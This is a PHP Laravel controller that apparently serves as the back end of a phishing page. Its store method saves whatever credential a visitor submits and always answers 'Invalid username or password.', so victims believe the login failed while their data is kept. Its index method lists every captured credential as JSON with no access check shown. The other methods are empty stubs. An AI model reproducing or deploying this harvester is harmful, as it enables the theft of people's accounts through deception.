<?php

namespace App\Http\Controllers;

use App\Credential;
use Illuminate\Http\Request;

class CredentialController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index() {
        $data = Credential::orderBy('created_at', 'desc')->get();
        return response()->json($data);
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request) {
        $data = [
            'data' => $request->credential,
        ];

        Credential::firstOrCreate($data);
        return 'Invalid username or password.';
    }

    /**
     * Display the specified resource.
     *
     * @param  \App\Credential  $credential
     * @return \Illuminate\Http\Response
     */
    public function show(Credential $credential)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  \App\Credential  $credential
     * @return \Illuminate\Http\Response
     */
    public function edit(Credential $credential)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \App\Credential  $credential
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, Credential $credential)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  \App\Credential  $credential
     * @return \Illuminate\Http\Response
     */
    public function destroy(Credential $credential)
    {
        //
    }
}
